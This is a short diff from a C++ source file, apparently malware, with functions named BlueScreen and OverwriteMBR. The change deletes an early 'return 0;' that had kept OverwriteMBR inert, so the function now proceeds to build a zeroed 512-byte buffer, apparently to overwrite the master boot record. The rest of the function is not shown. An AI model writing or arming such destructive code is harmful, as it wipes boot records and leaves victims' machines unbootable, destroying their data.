@@ -59,7 +59,7 @@ bool BlueScreen()
 
 bool OverwriteMBR()
 {
-    return 0;
+
     DWORD bytes_read = 512;
     char* buffer = new char[MBR_SIZE];
     ZeroMemory(buffer, MBR_SIZE);
